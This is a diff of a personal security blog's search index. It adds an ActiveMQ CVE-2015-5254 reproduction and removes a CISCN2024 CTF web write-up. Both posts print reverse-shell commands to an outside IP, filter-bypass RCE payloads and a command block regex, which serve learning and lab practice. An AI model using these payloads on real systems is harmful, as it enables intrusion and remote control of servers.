@@ -1,6 +1,67 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ActiveMQ反序列化漏洞(CVE-2015-5254)</title>
+    <url>/2024/05/30/ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2015-5254/</url>
+    <content><![CDATA[<h1 id="器动"><a href="#器动" class="headerlink" title="器动"></a>器动</h1><span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>算是漏洞复现第一章了吧</p>
+<p>目标:</p>
+<p>· 看这些大漏洞在实际的应用</p>
+<p>· 品味吸收发现漏洞和挖掘漏洞的过程</p>
+<p>· 修复漏洞</p>
+<p>· 思维发散，思考有没有其他地方会有同样的漏洞</p>
+<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Apache ActiveMQ 5.x ~ Apache ActiveMQ 5.13.0</p>
+<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。本质上还是对JMS的攻击，ActiveMQ不过是一个触发反序列化的跳板。</p>
+<p>有关JMS Attack的文章：</p>
+<p><a class="link"   href="https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf" >us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf (blackhat.com)<i class="fas fa-external-link-alt"></i></a></p>
+<p>上一篇的翻译</p>
+<p><a class="link"   href="https://www.anquanke.com/post/id/84954" >【技术分享】使用反序列化漏洞干掉你的JMS-安全客 - 安全资讯平台 (anquanke.com)<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h1><p>在发送object消息时的代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//send</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendObjectMessage</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    jmsTemplate.send(<span class="keyword">new</span> <span class="title class_">MessageCreator</span>() &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> Message <span class="title function_">createMessage</span><span class="params">(Session session)</span> <span class="keyword">throws</span> JMSException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Staff</span> <span class="variable">staff</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Staff</span>(<span class="number">1</span>, <span class="string">&quot;搬砖工&quot;</span>); <span class="comment">// Staff必须实现序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMessage</span> <span class="variable">message</span> <span class="operator">=</span> session.createObjectMessage(staff);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//receive</span></span><br><span class="line"> <span class="comment">// 如果是Object消息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (message <span class="keyword">instanceof</span> ObjectMessage) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="type">ObjectMessage</span> <span class="variable">om</span> <span class="operator">=</span> (ObjectMessage) message;</span><br><span class="line"></span><br><span class="line">      <span class="type">Staff</span> <span class="variable">staff</span> <span class="operator">=</span> (Staff) om.getObject();</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">&quot;ConsumerService从队列&quot;</span> + destination.toString() + <span class="string">&quot;收到了消息：\t&quot;</span> + staff);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>又到了我们最喜欢的getObject()环节</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240530143111195.png"  alt="image-20240530143111195"></p>
+<p>由于ActiveMQ的调试的debug有点复杂，也没来得及看源码</p>
+<p>不过如果你作为挖掘者，在知道以上信息的情况下，一定会源码都不用看，就应该合理猜测在ActiveMQ管理界面中接受消息，就等于执行了以上的receive代码吧，其实真的也不是我懒啦，这确实不用看，直接去试一波就好</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>先用nmap扫扫</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240530151309225.png"  alt="image-20240530151309225"></p>
+<p>发现了61616端口扫出是apachemq的发出端口，不知道为什么管理的端口没扫出来（pass，就当扫出来了）</p>
+<p><img   src="/../img/$%7Bfiilename%7D/ok-1717053248889-1.jpg"  alt="ok"></p>
+<p>wow，我们成功发现了后台界面(＾－＾)V</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240530151454795.png"  alt="image-20240530151454795"></p>
+<p>什么，居然用admin和admin就登陆进去了（）</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240530151523882.png"  alt="image-20240530151523882"></p>
+<p>居然正是漏洞版本，太巧了吧（</p>
+<p>然后我们像接受端口发送信息，然后在在这个界面接受，不就触发了一个反序列化吗</p>
+<p>这里需要用到一个工具jmet（查了一下好像就是类似个攻击脚本吧，真好，永远有配套服务）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#下载jmet的jar包</span><br><span class="line">wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</span><br><span class="line">#创建external目录，报错让创建的。。。。。。</span><br><span class="line">mkdir external</span><br></pre></td></tr></table></figure>
+
+<p>之后</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;cp README.txt README1.txt&quot; -Yp ROME 172.19.0.2 61616</span><br></pre></td></tr></table></figure>
+
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240530170736613.png"  alt="image-20240530170736613"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240530170748146.png"  alt="image-20240530170748146"></p>
+<p>这样就算成功啦，之后反弹shell即可，需要编码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMTc3LjI0MS8yMzMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 172.19.0.2 61616</span><br></pre></td></tr></table></figure>
+
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240530171632750.png"  alt="image-20240530171632750"></p>
+<p>getshell  !!!!!</p>
+<h1 id="修复漏洞"><a href="#修复漏洞" class="headerlink" title="修复漏洞"></a>修复漏洞</h1><p>1.拒绝反序列化危险的类</p>
+<p>2.解决前台弱口令问题</p>
+<p>3.隐藏接受信息的端口</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+        <tag>ActActiveMQ</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ActActiveMQ Arbitrary File Write Vulnerability (CVE-2016-3088)</title>
     <url>/2024/05/31/ActActiveMQ-Arbitrary-File-Write-Vulnerability-CVE-2016-3088/</url>
     <content><![CDATA[<h1 id="器动"><a href="#器动" class="headerlink" title="器动"></a>器动</h1><span id="more"></span>
@@ -81,144 +142,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CISCN2024-web复现</title>
-    <url>/2024/05/21/CISCN2024-web%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="初遇国赛"><a href="#初遇国赛" class="headerlink" title="初遇国赛"></a>初遇国赛</h1><span id="more"></span>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次打国赛，难度还是很大的，一题做一天唉，如图所示(2&#x2F;6)</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240521223322525.png"  alt="image-20240521223322525"></p>
-<p>说实话我认为我能做四题的，第一天一直在看Simple_php，最后十分钟打出来了，打得我都发抖了，然后第二天才开始看的cms，星期天刚刚到实验室打开电脑就看到大B哥捷报传来</p>
-<p><img   src="/../img/$%7Bfiilename%7D/2ea692c2a181a4ef0ae6828c46b8f539.jpg"  alt="2ea692c2a181a4ef0ae6828c46b8f539"></p>
-<p>五分钟拿下一血，你知道的，大b哥依旧这么强。</p>
-<p>之后就开始了漫长的坐牢生活，一直审源码审到三点才做了出来</p>
-<p>最后实在太累了，有种想死的无力感，随便打开题看看，开了个mossfen，给了源码一看，就知道是python沙盒栈帧逃逸，在中国海洋大学新生赛写过，但是没写出来，赛后也没看，好像考试前看过原题但是记不起来的感觉，最后实在累了，懒得看了。最后两个小时就随便看看密码和杂项（虽然一个没打出来就是了）</p>
-<p>赛后水了水群，才知道mossfen这题和中海大的菜鸟工具2确实是同一个出题人，于是我痛定思痛，每次比赛后都要好好复现，所以便有了这篇文章</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240521224229311.png"  alt="image-20240521224229311"></p>
-<p>HnuSec_5拿了个校内队第5，很会预言的名字，这使我大脑旋转</p>
-<p><img   src="/../img/$%7Bfiilename%7D/ok.jpg"  alt="ok"></p>
-<h1 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">     <span class="keyword">if</span>      (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>很干练的一题rce，没有整活，你执行不了都不给你个回显</p>
-<p>这边开局看到了<code>escapeshelllcmd()</code>，于是上网查，并且搜索相关绕过和漏洞，学到了一下信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当$cmd中包含‘&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$, \x0A 和 \xFF’任意一个，这个函数都会在前面加个转义字符，为什么会这样呢，因为这些东西在linux命令行中都是特别的存在，允许我们玩很多绕过的花招</span><br><span class="line">&amp;:可当命令的分隔符，也可以与&gt;&lt;组成重定向的文件合并，比如我们常见的反弹shell</span><br><span class="line">#:linux命令行的注释符(终止符)</span><br><span class="line">;:分隔符</span><br><span class="line">`:`cat flag`=&gt;flag&#123;ewoji_0000_114614&#125;</span><br><span class="line">|:隔开两个命令，并把上一个命令的输出当作下个命令的输入,ls | grep &#x27;flag&#x27;</span><br><span class="line">*:匹配任意个数任意字符fla?.php</span><br><span class="line">?:匹配一个任意字符f*</span><br><span class="line">~:cd ~切换到home目录</span><br><span class="line">&lt;&gt;:重定向符,可以使用cat&lt;flag.php绕过空格</span><br><span class="line">^:未知，似乎没找到什么有用的</span><br><span class="line">():无需多言</span><br><span class="line">[]:[A-Za-z0-9]表示所有字符数字，[a-c]表示abc,[-%] ”代表“ [!”#$%] </span><br><span class="line">&#123;&#125;:&#123;e,w,o,j,i&#125;可表示里面的任意字符，这个非常好用，[]只能在参数部分匹配，而&#123;&#125;甚至可以在命令部分匹配</span><br><span class="line"></span><br><span class="line">$:1.可以表示一个变量，作变量拼接a=f;b=l;c=a;d=g,$a$b$c$d=flag</span><br><span class="line">  2.可以表示一个空变量绕过空格,$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10) :比如ca$&#123;21&#125;t a.txt表示cat a.txt 在没有传入参数的情况下,这些特殊字符默认为空,如下:wh$1oami,who$@ami,whoa$*mi</span><br><span class="line">  3.可以看一些环境变量,echo $PATH,echo $SHELL</span><br><span class="line">  4.可以配合&#123;&#125;截取字母，如$&#123;PATH:5:1&#125;=&gt;l($PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin)</span><br><span class="line">  </span><br><span class="line">\x0A:换行符</span><br><span class="line">\xFF:不明白的神秘符号</span><br></pre></td></tr></table></figure>
-
-<p>咳咳，然后呢，搜了一大堆相关漏洞，什么宽字节都出来了，还是打不通，索性从绕过这个函数放弃</p>
-<p>然后望着一望无际的disable_functions思考人生</p>
-<p>一直在思考这个转义字符能有什么用，于是我开启了第一波尝试</p>
-<p>payload:<code>php -r var_dump(1);</code></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240522125934038.png"  alt="image-20240522125934038"></p>
-<p>执行了？为什么？</p>
-<p><a class="link"   href="https://www.cnblogs.com/jycjy/p/6937667.html" >Shell命令行中特殊字符与其转义详解(去除特殊含义) - 酸奶加绿茶 - 博客园 (cnblogs.com)<i class="fas fa-external-link-alt"></i></a></p>
-<p>一个命令的执行应该包括 命令+选项+参数，且顺序不能变</p>
-<p>就好比你<code>ls &gt; test.txt</code>可以成功而<code>test.txt &lt; ls</code>会报错说没有ls这个文件</p>
-<p>命令和选项按顺序填好后，就是参数了，参数不是特殊字符，当参数包含特殊字符时需要转义</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240522131043137.png"  alt="image-20240522131043137"></p>
-<p>执行了两个不同的命令，取决于&amp;有没有被转义，这里我用了’’去转义&amp;，你也可以使用””或\去转义</p>
-<p>这样就可以解释了我的 <code>php -r var_dump\(1\)\;</code>为什么执行了，特殊字符被转义，实际上执行的就是<code>php -r var_dump(1)</code></p>
-<p><strong>所以说有时候限制我们的，换个角度看，就可以变成帮助我们的</strong></p>
-<p>所以接下来只需要编码绕过disable_functions即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1:cmd=php -r eval(hex2bin(substr(_73797374656d28276c7327293b,1)));=&gt;system(&#x27;ls&#x27;);</span><br><span class="line">这里涉及到php一个特性,php的常量命名方式是下划线+字母，当你尝试</span><br><span class="line">echo _123;会报错，但是会正常输出_123</span><br><span class="line">这也就是为什么我们可以正常获得_后的字符串</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload2:cmd=eval `ec\ho bHM=|base\64 -d`=&gt;eval &#x27;ls&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>rce之后记得flag在数据库里面。。。。。。。。。。。。。。。。。。。</p>
-<p><code>mysql -u root -proot -e xxxxx</code></p>
-<h1 id="easycms-easycms-revenge"><a href="#easycms-easycms-revenge" class="headerlink" title="easycms&amp;&amp;easycms_revenge"></a>easycms&amp;&amp;easycms_revenge</h1><h3 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h3><p>一个hint:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;</span>;</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>REMOTE_ADDR不可伪造，需要找ssrf</p>
-<p>其实一开始还去试了试删除install.lock，但是要找admin后台还要登录，做了一大堆无用功后我才想到要进行ssrf的</p>
-<p>既然要请求外部的资源，自然而然的想到api模块，于是打开源码开始审计api模块，貌似有20多个api，一个一个往下审，发现第三个可以用，还算运气好了，当时已经准备死磕这里了</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 二维码显示</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">qrcode</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;text&#x27;</span>));</span><br><span class="line">    <span class="variable">$thumb</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;thumb&#x27;</span>));</span><br><span class="line">    <span class="variable">$matrixPointSize</span> = (<span class="keyword">int</span>)<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;size&#x27;</span>);</span><br><span class="line">    <span class="variable">$errorCorrectionLevel</span> = <span class="title function_ invoke__">dr_safe_replace</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;level&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//生成二维码图片</span></span><br><span class="line">    <span class="keyword">require_once</span> CMSPATH.<span class="string">&#x27;Library/Phpqrcode.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$file</span> = WRITEPATH.<span class="string">&#x27;file/qrcode-&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>.<span class="variable">$thumb</span>.<span class="variable">$matrixPointSize</span>.<span class="variable">$errorCorrectionLevel</span>).<span class="string">&#x27;-qrcode.png&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title class_">\QRcode</span>::<span class="title function_ invoke__">png</span>(<span class="variable">$value</span>, <span class="variable">$file</span>, <span class="variable">$errorCorrectionLevel</span>, <span class="variable">$matrixPointSize</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$thumb</span>) &#123;</span><br><span class="line">            <span class="variable">$logo</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="title function_ invoke__">dr_catcher_data</span>(<span class="variable">$thumb</span>));</span><br><span class="line">            <span class="variable">$QR_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$QR</span>);<span class="comment">//二维码图片宽度</span></span><br><span class="line">            <span class="variable">$QR_height</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$QR</span>);<span class="comment">//二维码图片高度</span></span><br><span class="line">            <span class="variable">$logo_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$logo</span>);<span class="comment">//logo图片宽度</span></span><br><span class="line">            <span class="variable">$logo_height</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$logo</span>);<span class="comment">//logo图片高度</span></span><br><span class="line">            <span class="variable">$logo_qr_width</span> = <span class="variable">$QR_width</span> / <span class="number">4</span>;</span><br><span class="line">            <span class="variable">$scale</span> = <span class="variable">$logo_width</span>/<span class="variable">$logo_qr_width</span>;</span><br><span class="line">            <span class="variable">$logo_qr_height</span> = <span class="variable">$logo_height</span>/<span class="variable">$scale</span>;</span><br><span class="line">            <span class="variable">$from_width</span> = (<span class="variable">$QR_width</span> - <span class="variable">$logo_qr_width</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="comment">//重新组合图片并调整大小</span></span><br><span class="line">            <span class="title function_ invoke__">imagecopyresampled</span>(<span class="variable">$QR</span>, <span class="variable">$logo</span>, <span class="variable">$from_width</span>, <span class="variable">$from_width</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="variable">$logo_qr_width</span>, <span class="variable">$logo_qr_height</span>, <span class="variable">$logo_width</span>, <span class="variable">$logo_height</span>);</span><br><span class="line">            <span class="title function_ invoke__">imagepng</span>(<span class="variable">$QR</span>, <span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出图片</span></span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_clean</span>();</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: image/png&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">ImagePng</span>(<span class="variable">$QR</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>一个可以请求外部资源并且生成二维码的api</p>
-<p>先看大意:</p>
-<p>1.接收4个参数，其中text,size,level是关于二维码的信息,thumb是关于logo的信息,logo就有时候在二维码中间的那个小图片</p>
-<p>2.用四个参数命名为一个文件名，如果存在则直接读出$QR(图片对象),若不存在则创建一个图片对象</p>
-<p>3.检测是否需要logo，如果需要logo，就重新调整图片并且插入logo</p>
-<p>所以说，logo图片是可以请求外部资源获得的,那就看看它怎么来的</p>
-<p><code>$logo = imagecreatefromstring(dr_catcher_data($thumb));</code></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240523173818570.png"  alt="image-20240523173818570"></p>
-<p>ssrf入口点找到了,于是在自己的vps写好跳转,然后在cmd上写上反弹shell命令即可</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target_url</span> = <span class="string">&quot;http://127.0.0.1/flag.php?cmd=php+-r+%27%24sock%3dfsockopen(%2247.100.177.241%22%2c23333)%3bexec(%22bash+%3c%263+%3e%263+2%3e%263%22)%3b%27&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$target_url</span>,<span class="literal">true</span>,<span class="number">302</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>payload:<code>http://eci-2ze3cmcfbu4hoso5luoc.cloudeci1.ichunqiu.com/index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=Your vps&amp;text=1&amp;size=1&amp;level=1</code></p>
-<p>发现有个可执行文件readflag,.&#x2F;readflag即可</p>
-<h3 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h3><p>前面步骤一样，主要是对logo的请求有了过滤，需要对文件进行伪造，类型文件上传的图片马吧，超链接直接连接资源，所以文件名不会被检测（我的理解），所以伪造内容就好</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line">GIF89a<span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeewwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooojjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$target_url</span> = <span class="string">&quot;http://127.0.0.1/flag.php?cmd=php+-r+%27%24sock%3dfsockopen(%2247.100.177.241%22%2c23333)%3bexec(%22bash+%3c%263+%3e%263+2%3e%263%22)%3b%27&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$target_url</span>,<span class="literal">true</span>,<span class="number">302</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>看了一下别人wp发现有非预期，有个down_img，但是我死活找不到，可能是我下载的源码的问题？？？这出题人不给个附件有点顶不得</p>
-<h1 id="mossfern"><a href="#mossfern" class="headerlink" title="mossfern"></a>mossfern</h1><p>给了两个附件</p>
-<p>main.py</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid1</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">runner = <span class="built_in">open</span>(<span class="string">&quot;/app/runner.py&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).read()</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).readline().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">str</span>(uuid1())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(</span><br><span class="line">            runner.replace(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag).replace(<span class="string">&quot;THIS_IS_TASK_RANDOM_ID&quot;</span>, <span class="built_in">id</span>))</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(data.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">        run = subprocess.run(</span><br><span class="line">            [<span class="string">&#x27;python&#x27;</span>, <span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>],</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.PIPE,</span><br><span class="line">            timeout=<span class="number">3</span></span><br><span class="line">        )</span><br><span class="line">        result = run.stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        error = run.stderr.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(result, error)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span 